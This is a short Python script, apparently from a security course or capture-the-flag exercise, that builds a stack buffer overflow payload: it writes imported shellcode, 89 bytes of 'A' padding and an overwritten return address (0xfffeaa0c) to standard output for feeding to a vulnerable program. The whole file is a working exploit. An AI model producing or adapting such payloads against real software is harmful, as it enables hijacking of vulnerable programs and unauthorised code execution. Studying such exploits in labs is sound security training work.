from struct import pack
from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode + bytes.fromhex('41'*89) + pack("<I", 0xfffeaa0c))
